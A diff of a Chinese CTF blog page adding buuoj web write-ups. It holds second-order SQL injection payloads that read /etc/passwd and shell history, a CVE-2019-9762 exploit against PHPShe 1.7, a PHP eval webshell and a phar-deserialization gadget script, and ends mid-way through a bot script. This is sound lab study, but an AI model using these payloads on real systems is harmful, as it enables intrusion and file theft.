@@ -28,6 +28,7 @@
 <h1 class=pt-2>buuoj刷题记录-web</h1>
 <h3 class="text-java-700 font-normal leading-relaxed pt-2">温故而知新，学他妈的</h3>
 <div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
+<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/lts>LTS</a>&nbsp;/
 <a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
 &nbsp;&nbsp;
 <a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
@@ -41,7 +42,9 @@
 <nav id=TableOfContents>
 <ul>
 <li><a href=#page-01>page 01</a></li>
+<li><a href=#page-03>page 03</a></li>
 <li><a href=#page-07>page 07</a></li>
+<li><a href=#page-08>page 08</a></li>
 </ul>
 </nav>
 </div>
@@ -54,7 +57,7 @@
 <section class="mx-auto content">
 <div class=c-rich-text><p>因为前面做的很多由于时间关系遗忘了不少，趁着寒假来温故知新刷波题，这里就做个buuoj-web部分刷题的存档，应该都比较详细</p>
 <p>打星号的可能是因为环境问题复现不了，或者自己有地方没搞懂</p>
-<p>————前排食用注意：可展开的部分中是没有很好的md排版的</p>
+<p>————前排食用注意：可展开的部分中是没有很好的md排版的（不做二级标题是不想左侧toc和整体页面太臃肿Orz.</p>
 <hr>
 <h2 id=page-01>page 01</h2>
 <details>
@@ -839,6 +842,83 @@ echo serialize($a);
 </code></pre><p>不反序列化也行，它没过滤<code>load_file</code>直接就读文件了</p>
 <pre tabindex=0><code>/view.php?no=-1 union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4%23
 </code></pre><p>有点奇怪的，你说它过滤空格，但是前面那个不用注释也可以，而且前面参数是1还不行</p>
+</details>
+<h2 id=page-03>page 03</h2>
+<details>
+<summary>
+<h4 class=inline>
+[网鼎杯 2018]Comment
+</h4>
+</summary>
+<p>发帖会先要求登录，提示<code>zhangwei: zhangwei***</code>，盲猜666，登入</p>
+<p>帖子的详情页可以提交留言，这里有xss（但是没啥用 又没bot），f12有一句提示<code>程序员GIT写一半跑路了,都没来得及Commit :)</code>，用Githacker看看源码</p>
+<pre tabindex=0><code>githacker --url http://c7839413-2569-4342-ac29-8b5810a4c8c4.node4.buuoj.cn:81/ --folder result
+</code></pre><p>因为提示说有一个记录没有commit，我们尝试恢复</p>
+<pre tabindex=0><code>git log --reflog	# 有一条后面带括号(refs/stash) 暂存区
+sudo git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
+</code></pre><p>得到完整的源码</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>include</span> <span style=color:#d88200>&#34;mysql.php&#34;</span><span style=color:#111>;</span>
+<span style=color:#75af00>session_start</span><span style=color:#111>();</span>
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$_SESSION</span><span style=color:#111>[</span><span style=color:#d88200>&#39;login&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#39;yes&#39;</span><span style=color:#111>){</span>
+    <span style=color:#75af00>header</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Location: ./login.php&#34;</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>die</span><span style=color:#111>();</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>isset</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;do&#39;</span><span style=color:#111>])){</span>
+    <span style=color:#00a8c8>switch</span> <span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;do&#39;</span><span style=color:#111>])</span>
+    <span style=color:#111>{</span>
+        <span style=color:#00a8c8>case</span> <span style=color:#d88200>&#39;write&#39;</span><span style=color:#f92672>:</span>
+            <span style=color:#111>$category</span> <span style=color:#f92672>=</span> <span style=color:#75af00>addslashes</span><span style=color:#111>(</span><span style=color:#111>$_POST</span><span style=color:#111>[</span><span style=color:#d88200>&#39;category&#39;</span><span style=color:#111>]);</span>
+            <span style=color:#111>$title</span> <span style=color:#f92672>=</span> <span style=color:#75af00>addslashes</span><span style=color:#111>(</span><span style=color:#111>$_POST</span><span style=color:#111>[</span><span style=color:#d88200>&#39;title&#39;</span><span style=color:#111>]);</span>
+            <span style=color:#111>$content</span> <span style=color:#f92672>=</span> <span style=color:#75af00>addslashes</span><span style=color:#111>(</span><span style=color:#111>$_POST</span><span style=color:#111>[</span><span style=color:#d88200>&#39;content&#39;</span><span style=color:#111>]);</span>
+            <span style=color:#111>$sql</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;insert into board
+</span><span style=color:#d88200>            set category = &#39;</span><span style=color:#d88200>$category</span><span style=color:#d88200>&#39;,
+</span><span style=color:#d88200>                title = &#39;</span><span style=color:#d88200>$title</span><span style=color:#d88200>&#39;,
+</span><span style=color:#d88200>                content = &#39;</span><span style=color:#d88200>$content</span><span style=color:#d88200>&#39;&#34;</span><span style=color:#111>;</span>
+            <span style=color:#111>$result</span> <span style=color:#f92672>=</span> <span style=color:#75af00>mysql_query</span><span style=color:#111>(</span><span style=color:#111>$sql</span><span style=color:#111>);</span>
+            <span style=color:#75af00>header</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Location: ./index.php&#34;</span><span style=color:#111>);</span>
+            <span style=color:#00a8c8>break</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>case</span> <span style=color:#d88200>&#39;comment&#39;</span><span style=color:#f92672>:</span>
+            <span style=color:#111>$bo_id</span> <span style=color:#f92672>=</span> <span style=color:#75af00>addslashes</span><span style=color:#111>(</span><span style=color:#111>$_POST</span><span style=color:#111>[</span><span style=color:#d88200>&#39;bo_id&#39;</span><span style=color:#111>]);</span>
+            <span style=color:#111>$sql</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;select category from board where id=&#39;</span><span style=color:#d88200>$bo_id</span><span style=color:#d88200>&#39;&#34;</span><span style=color:#111>;</span>
+            <span style=color:#111>$result</span> <span style=color:#f92672>=</span> <span style=color:#75af00>mysql_query</span><span style=color:#111>(</span><span style=color:#111>$sql</span><span style=color:#111>);</span>
+            <span style=color:#111>$num</span> <span style=color:#f92672>=</span> <span style=color:#75af00>mysql_num_rows</span><span style=color:#111>(</span><span style=color:#111>$result</span><span style=color:#111>);</span>
+            <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$num</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span><span style=color:#111>){</span>
+                <span style=color:#111>$category</span> <span style=color:#f92672>=</span> <span style=color:#75af00>mysql_fetch_array</span><span style=color:#111>(</span><span style=color:#111>$result</span><span style=color:#111>)[</span><span style=color:#d88200>&#39;category&#39;</span><span style=color:#111>];</span>
+                <span style=color:#111>$content</span> <span style=color:#f92672>=</span> <span style=color:#75af00>addslashes</span><span style=color:#111>(</span><span style=color:#111>$_POST</span><span style=color:#111>[</span><span style=color:#d88200>&#39;content&#39;</span><span style=color:#111>]);</span>
+                <span style=color:#111>$sql</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;insert into comment
+</span><span style=color:#d88200>            set category = &#39;</span><span style=color:#d88200>$category</span><span style=color:#d88200>&#39;,
+</span><span style=color:#d88200>                content = &#39;</span><span style=color:#d88200>$content</span><span style=color:#d88200>&#39;,
+</span><span style=color:#d88200>                bo_id = &#39;</span><span style=color:#d88200>$bo_id</span><span style=color:#d88200>&#39;&#34;</span><span style=color:#111>;</span>
+                <span style=color:#111>$result</span> <span style=color:#f92672>=</span> <span style=color:#75af00>mysql_query</span><span style=color:#111>(</span><span style=color:#111>$sql</span><span style=color:#111>);</span>
+            <span style=color:#111>}</span>
+            <span style=color:#75af00>header</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Location: ./comment.php?id=</span><span style=color:#d88200>$bo_id</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+            <span style=color:#00a8c8>break</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>default</span><span style=color:#f92672>:</span>
+            <span style=color:#75af00>header</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Location: ./index.php&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>else</span><span style=color:#111>{</span>
+    <span style=color:#75af00>header</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Location: ./index.php&#34;</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>可以看到只有<code>category</code>没有被<code>addslashes</code>过滤，是直接将执行的结果进行拼接，这里是我们的入手点；先在write处插入，再在comment处闭合前面的注释符，执行结果</p>
+<pre tabindex=0><code>write: category=',content=user(),/*
+comment: content=*/#
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160242124.png alt=image-20210624160242124.png></p>
+<pre tabindex=0><code>write: category=',content=(select load_file('/etc/passwd')),/*
+comment: content=*/#
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160515229.png alt></p>
+<p>看到最后一行的www用户，继续查看.bash_history记录</p>
+<pre tabindex=0><code>write: category=',content=(select load_file('/home/www/.bash_history')),/*
+comment: content=*/#
+</code></pre><p>看到了.DS_Store文件，在linux中它的位置一般在<code>/tmp</code>下，同时.DS_Store中经常有不可见字符，所以加一层hex再读出</p>
+<pre tabindex=0><code>write: category=',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
+comment: content=*/#
+</code></pre><p>看到flag_8946e1ff1ee3e40f.php，也加一层hex</p>
+<pre tabindex=0><code>write: category=',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
+comment: content=*/#
+</code></pre><p>————雀食很牛逼的二次注入</p>
 </details>
 <h2 id=page-07>page 07</h2>
 <details>
@@ -2673,6 +2753,980 @@ POST: filename=../../../flag.txt&amp;amiz=&lt;x
 </code></pre></div><p>修改后缀和MIME上传，路径是/login/amiz.jpg（是用户名</p>
 <p>再回到注册上传那里，修改用户名为<code>php://amiz</code>，然后GET参数触发shell即可</p>
 </details>
+<details>
+<summary>
+<h4 class=inline>
+[RoarCTF 2019]PHPShe
+</h4>
+</summary>
+<p>附件里有<code>.idea</code>，给了一些提示，是1.7版本的phpshe，有<a href=https://anquan.baidu.com/article/697>两个已知的cve</a>，不过xxe那个因为不存在对应的php文件，所以用sql那个cve-2019-9762，下面跟一下分析的过程</p>
+<p>在include/function/global.func.php下有针对数据库安全的函数<code>pe_dbhold()</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119152726454.png alt=image-20220119152726454></p>
+<p>参数会被<code>addslashes</code>处理，我们的引号和反斜杠不保，那看看有没有不用引号也可以注入的地方或者是宽字节注入</p>
+<p>在include/plugin/payment/alipay/pay.php中对<code>$order_id</code>参数进行了这样的处理</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153255328.png alt=image-20220119153255328></p>
+<p>其中奇奇怪怪的<code>$_g_id</code>是对post参数的重命名，在common.php中</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153357784.png alt=image-20220119153357784></p>
+<p>用到了<code>extract</code>对变量名前面加上<code>_g_</code>或<code>_p_</code>的前缀</p>
+<p>回到上面，get方式传入的id参数先经过<code>pe_dbhold</code>处理后赋值给<code>$order_id</code>，随后进入<code>order_table</code>函数，位于hook/order.hook.php</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153634436.png alt=image-20220119153634436></p>
+<p>如果传入的参数含有<code>_</code>，则会以它为分隔符，返回<code>order_</code>+<code>_</code>前的第一部分，如果参数不含<code>_</code>直接返回order</p>
+<p>再回到前面的<code>pe_select</code>，位于include/class/db.class.php</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119154502441.png alt=image-20220119154502441></p>
+<p>这不巧了，参数部分用的是反引号而不是单引号，传入的<code>$order_id</code>就是这里的<code>$table</code>部分，<code>dbpre</code>是数据库表前缀；构造这样的payload</p>
+<pre tabindex=0><code>pay` where 1=1 and sleep(5)%23_
+</code></pre><p>经过<code>order_table</code>和<code>pe_select</code>之后是这样的语句</p>
+<pre tabindex=0><code>select * from `order_pay` where 1=1 and sleep(5)#` where `order_id` = `pay` where 1=1 and sleep(5)#_ limit 1
+</code></pre><p>然后找利用点，在include/plugin/payment/alipay/pay.php中有利用点并且有回显位；因为对<code>_</code>的特殊处理，我们无法用<code>information_schema</code>来查表，所以只能在不知道列名的情况下注入</p>
+<pre tabindex=0><code>select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1
+</code></pre><p>构造payload</p>
+<pre tabindex=0><code>GET /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
+</code></pre><p>得到admin密码的md5值，查一下得到<code>altman777</code>，在/admin.php处登入后台</p>
+<p>首先在品牌管理处可以上传文件</p>
+<p>借助.idea给出的提示，在include/class/pclzip.class.php有个比官方文件多出来的<code>__destruct</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161251378.png alt=image-20220119161251378></p>
+<p>还有自带的<code>__construct</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161950386.png alt=image-20220119161950386></p>
+<p>还有个打开的module/admin/moban.php和include/function/global.func.php，在<code>down</code>操作中实例化上面的<code>PclZip</code>类，之后用<code>extract()</code>来解压zip文件，<code>$moban_template</code>是文件路径</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162417889.png alt=image-20220119162417889></p>
+<p>在<code>del</code>操作中调用<code>pe_dirdel</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162704144.png alt=image-20220119162704144></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162714647.png alt=image-20220119162714647></p>
+<p>有个<code>is_file($dir_path)</code>可以触发反序列化</p>
+<p>结合上面的<code>__destruct</code>中的<code>extract</code>，肯定是phar反序列化了，在前面上传的地方上传压缩过的webshell，然后再传入phar，里面参数的路径指向前面的zip路径，被反序列化后触发<code>__destruct</code> 解压zip到一个可读写目录/var/www/html/data中</p>
+<pre tabindex=0><code>&lt;?php eval($_POST['amiz']);?&gt;
+</code></pre><p><a href=http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip>http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip</a></p>
+<pre tabindex=0><code>&lt;?php
+class PclZip{
+    var $zipname = '';
+    var $zip_fd = 0;
+    var $error_code = 1;
+    var $error_string = '';
+    var $magic_quotes_status;
+    var $save_path = '/var/www/html/data';//解压目录
+
+    function __construct($p_zipname){
+
+        $this-&gt;zipname = $p_zipname;
+        $this-&gt;zip_fd = 0;
+        $this-&gt;magic_quotes_status = -1;
+
+        return;
+    }
+
+}
+
+$a=new PclZip(&quot;/var/www/html/data/attachment/brand/1.zip&quot;);//压缩的文件路径
+echo serialize($a);
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($a);
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;m0c1nu7&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+
+</code></pre><p><a href=http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt>http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt</a></p>
+<p>之后触发phar反序列化</p>
+<pre tabindex=0><code>GET /admin.php?mod=moban&amp;act=del&amp;token=709991a77ab3f79e5dcad72d0453978e&amp;tpl=phar:///var/www/html/data/attachment/brand/2.txt
+Referer: http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/admin.php?mod=moban
+</code></pre><p>这里需要传入csrf的token（post上传处可以拿到），还需要设置一下Referer</p>
+<p>flag{9085d530-559f-49bd-9e0e-718780146bd3}</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+*[Zer0pts2020]musicblog
+</h4>
+</summary>
+<p>注册账号并登入，可以创建post，勾选publish可以有admin访问，这肯定是个xss类的题目了</p>
+<p>整个站有比较完善的csp规则</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180148197.png alt=image-20220119180148197></p>
+<p>看下worker.js的工作逻辑</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>const</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>md5</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;md5&#39;</span><span style=color:#111>);</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>puppeteer</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;puppeteer&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>Redis</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ioredis&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>connection</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Redis</span><span style=color:#111>(</span><span style=color:#ae81ff>6379</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;redis&#39;</span><span style=color:#111>);</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>admin_username</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>admin_password</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;w28J0zjqpp6w9Ty8Sl58Z7iEf4h911zZ&#34;</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>flag</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;zer0pts{M4sh1m4fr3sh!!}&#39;</span><span style=color:#111>;</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>browser_option</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>executablePath</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;google-chrome-unstable&#39;</span><span style=color:#111>,</span>
+    <span style=color:#75af00>headless</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>,</span>
+    <span style=color:#75af00>args</span><span style=color:#f92672>:</span> <span style=color:#111>[</span>
+        <span style=color:#d88200>&#39;--no-sandbox&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--disable-background-networking&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--disable-default-apps&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--disable-extensions&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--disable-gpu&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--disable-sync&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--disable-translate&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--hide-scrollbars&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--metrics-recording-only&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--mute-audio&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--no-first-run&#39;</span><span style=color:#111>,</span>
+        <span style=color:#d88200>&#39;--safebrowsing-disable-auto-update&#39;</span><span style=color:#111>,</span>
+    <span style=color:#111>],</span>
+<span style=color:#111>};</span>
+<span style=color:#00a8c8>let</span> <span style=color:#75af00>browser</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>undefined</span><span style=color:#111>;</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>crawl</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>async</span> <span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`[+] Query! (</span><span style=color:#d88200>${</span><span style=color:#75af00>url</span><span style=color:#d88200>}</span><span style=color:#d88200>)`</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>page</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>browser</span><span style=color:#111>.</span><span style=color:#75af00>newPage</span><span style=color:#111>();</span>
+    <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>setUserAgent</span><span style=color:#111>(</span><span style=color:#75af00>flag</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#00a8c8>goto</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+            <span style=color:#75af00>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;networkidle0&#39;</span><span style=color:#111>,</span>
+            <span style=color:#75af00>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span><span style=color:#111>,</span>
+        <span style=color:#111>});</span>
+        <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>click</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#like&#39;</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>waitForNavigation</span><span style=color:#111>({</span><span style=color:#75af00>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span><span style=color:#111>});</span>
+    <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>){</span>
+        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span>
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>close</span><span style=color:#111>();</span>
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`[+] Done! (</span><span style=color:#d88200>${</span><span style=color:#75af00>url</span><span style=color:#d88200>}</span><span style=color:#d88200>)`</span><span style=color:#111>)</span>
+<span style=color:#111>};</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>init</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>async</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>browser</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>puppeteer</span><span style=color:#111>.</span><span style=color:#75af00>launch</span><span style=color:#111>(</span><span style=color:#75af00>browser_option</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>page</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>browser</span><span style=color:#111>.</span><span style=color:#75af00>newPage</span><span style=color:#111>();</span>    
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`[+] Setting up...`</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#00a8c8>goto</span><span style=color:#111>(</span><span style=color:#d88200>`http://challenge/login.php`</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>waitFor</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#username&#39;</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>type</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#username&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>admin_username</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>waitFor</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#password&#39;</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>type</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#password&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>admin_password</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>waitFor</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#login-submit&#39;</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#111>Promise</span><span style=color:#111>.</span><span style=color:#75af00>all</span><span style=color:#111>([</span>
+            <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>$eval</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#login-submit&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>elem</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>elem</span><span style=color:#111>.</span><span style=color:#75af00>click</span><span style=color:#111>()),</span>
+            <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>waitForNavigation</span><span style=color:#111>()</span>
+        <span style=color:#111>]);</span>
+        <span style=color:#00a8c8>const</span> <span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>evaluate</span><span style=color:#111>(()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#d88200>&#39;href=&#34;posts.php&#34;&#39;</span><span style=color:#111>)){</span>
+            <span style=color:#00a8c8>throw</span> <span style=color:#111>Error</span><span style=color:#111>(</span><span style=color:#d88200>`Login failed at </span><span style=color:#d88200>${</span><span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>url</span><span style=color:#111>()</span><span style=color:#d88200>}</span><span style=color:#d88200>.`</span><span style=color:#111>);</span>
+        <span style=color:#111>}</span>
+        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`[+] Setup done!`</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`[-] Error while setting up :(`</span><span style=color:#111>);</span>
+        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>const</span> <span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>evaluate</span><span style=color:#111>(()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span><span style=color:#111>);</span>
